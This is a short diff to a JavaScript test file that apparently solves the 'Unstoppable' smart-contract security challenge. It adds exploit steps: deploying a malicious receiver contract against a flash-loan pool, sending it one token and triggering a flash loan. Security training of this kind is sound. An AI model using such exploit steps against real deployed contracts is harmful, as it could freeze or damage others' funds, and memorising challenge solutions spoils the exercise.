@@ -39,8 +39,12 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Exploit', async function () {
+        const MaliciousReceiverContractFactory = await ethers.getContractFactory('MaliciousReceiverUnstoppable', attacker);
+        const attackerReceiver = await MaliciousReceiverContractFactory.deploy(this.pool.address);
+        await this.token.connect(attacker).transfer(attackerReceiver.address, 1);
+        await attackerReceiver.executeFlashLoan(10);
         /** CODE YOUR EXPLOIT HERE */
-    });
+});
 
     after(async function () {
         /** SUCCESS CONDITIONS */
